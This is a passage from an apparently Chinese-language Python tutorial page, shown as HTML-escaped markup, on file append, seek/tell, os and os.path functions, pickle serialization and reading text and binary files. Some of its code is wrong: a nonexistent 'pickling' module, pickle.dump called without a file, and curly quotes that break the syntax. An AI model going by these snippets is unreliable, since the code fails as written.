&lt;&#x2F;span&gt;&lt;span&gt;file1.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;close&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;文件增加&lt;&#x2F;p&gt;
&lt;p&gt;通过a方式打开文件，就可以在原有内容上增加&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;file1=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;newfile.txt&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;a&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;file1.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;write&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;123456&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;file1.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;close&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;文件偏移&lt;&#x2F;p&gt;
&lt;p&gt;file.tell() 表示当前指针所在的位置&lt;&#x2F;p&gt;
&lt;p&gt;file.seek() 指定指针偏移的位置&lt;&#x2F;p&gt;
&lt;p&gt;file.seek(offset,whence=0)&lt;&#x2F;p&gt;
&lt;p&gt;Offset代表偏移量，whence 0代表起始位置，1代表当前位置，2代表文件末尾&lt;&#x2F;p&gt;
&lt;p&gt;读取当前文件指针位置&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;file1=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;newfile.txt&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;r+&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;a=file1.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;tell&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(a)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;指针从起始位置偏移10&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;file1=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;newfile.txt&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;r+&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;file1.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;seek&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;a=file1.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;tell&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(a)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;文件重命名&lt;&#x2F;p&gt;
&lt;p&gt;导入系统模块&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;os&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;os.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rename&lt;&#x2F;span&gt;&lt;span&gt;(‘oldfilename’,’newfilename’)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;文件删除&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;os.remove&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;目录处理：&lt;&#x2F;p&gt;
&lt;p&gt;os模块&lt;&#x2F;p&gt;
&lt;p&gt;获取目录&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;os.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;getcwd&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;创建目录&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;os.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;mkdir&lt;&#x2F;span&gt;&lt;span&gt;(‘newdir’)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;删除目录&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;os.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rmdir&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;查看目录内容&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;os.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;listdir&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;os.path模块：&lt;&#x2F;p&gt;
&lt;p&gt;查询文件&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;os.path.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;isfile&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;查询目录&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;os.path.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;isdir&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;查看大小&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;os.path.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;getsize&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;序列化&lt;&#x2F;p&gt;
&lt;p&gt;我们用Python对象所进行的操作都是在内存中，若Python程序关闭，则内存被清空。。&lt;&#x2F;p&gt;
&lt;p&gt;为了将我们所操作的内容永久存储，就需要序列化&lt;&#x2F;p&gt;
&lt;p&gt;序列化就是将复杂的数据结构（对象）转换为一个二进制集合（数据流）,这样就可以把数据永久存储或通过网络发送，然后再重新把数据流恢复到原来的对象内容&lt;&#x2F;p&gt;
&lt;p&gt;变量&#x2F;对象从内存中变成可存储或者传输的过程称之为序列化&lt;&#x2F;p&gt;
&lt;p&gt;常见的序列化方法：pickling 、serialization、marshaling、flattening&lt;&#x2F;p&gt;
&lt;p&gt;pickling&lt;&#x2F;p&gt;
&lt;p&gt;提供了Python对象的序列化和存储转换功能&lt;&#x2F;p&gt;
&lt;p&gt;函数&lt;&#x2F;p&gt;
&lt;p&gt;pickling.dump()&lt;&#x2F;p&gt;
&lt;p&gt;接收一个文件或一个数据对象，以特定格式保存到给定文件中&lt;&#x2F;p&gt;
&lt;p&gt;pickling.load()&lt;&#x2F;p&gt;
&lt;p&gt;从文件中取出已保存的对象时，pickle知道如何恢复这些对象到它们原来的格式&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;pickle&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;a=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(pickle.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;dump&lt;&#x2F;span&gt;&lt;span&gt;(a)) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#将对象序列化&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;b=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;hello,world&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(pickle.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;dump&lt;&#x2F;span&gt;&lt;span&gt;(b) )&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;pickle&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt; &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;b=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;hello,world&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;f=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;dump.txt&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;wb&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;pickle.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;dump&lt;&#x2F;span&gt;&lt;span&gt;(b,f)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;f.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;close&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;把中文做序列化&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;pickle&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt; &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;b=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;你好，世界&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;f=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;dump.txt&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;wb+&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;pickle.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;dump&lt;&#x2F;span&gt;&lt;span&gt;(b,f)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;f.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;close&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;反序列化(显示回原来的文本)&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;f=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;dump.txt&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;rb+&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;d=pickle.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;load&lt;&#x2F;span&gt;&lt;span&gt;(f,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;encoding&lt;&#x2F;span&gt;&lt;span&gt;=’utf-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span&gt;’)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;f.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;close&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(d)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;读写文本文件&lt;&#x2F;p&gt;
&lt;p&gt;使用for-in循环逐行读取或者使用readlines将文件按行读取&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#一次性读取整个文件内容&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;with &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;致橡树.txt&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;r&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;encoding&lt;&#x2F;span&gt;&lt;span&gt;=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;utf-8&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;as &lt;&#x2F;span&gt;&lt;span&gt;f:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(f.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;read&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#通过for-in循环逐行读取&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;with &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;致橡树.txt&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;r&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;encoding&lt;&#x2F;span&gt;&lt;span&gt;=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;utf-8&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;as &lt;&#x2F;span&gt;&lt;span&gt;f:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;line &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;f:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(line,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;end&lt;&#x2F;span&gt;&lt;span&gt;=&amp;#39;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#按行读取文件到列表中&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;with &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;致橡树.txt&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;r&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;encoding&lt;&#x2F;span&gt;&lt;span&gt;=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;utf-8&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;as &lt;&#x2F;span&gt;&lt;span&gt;f:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	lines=f.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;readlines&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(lines)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;读写二进制文件&lt;&#x2F;p&gt;
&lt;p&gt;实现复制拖文件的功能&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;with &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&#x2F;Users&#x2F;numb&#x2F;Documents&#x2F;vscode project&#x2F;timg.jpeg&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;rb&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;as &lt;&#x2F;span&gt;&lt;span&gt;fs1:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;		data=fs1.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;read&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(data)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;with &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&#x2F;Users&#x2F;numb&#x2F;Documents&#x2F;vscode project&#x2F;gmit.jpeg&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;wb&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;as &lt;&#x2F;span&gt;&lt;span&gt;fs2:&lt;&#x2F;span&gt;&lt;span&gt;
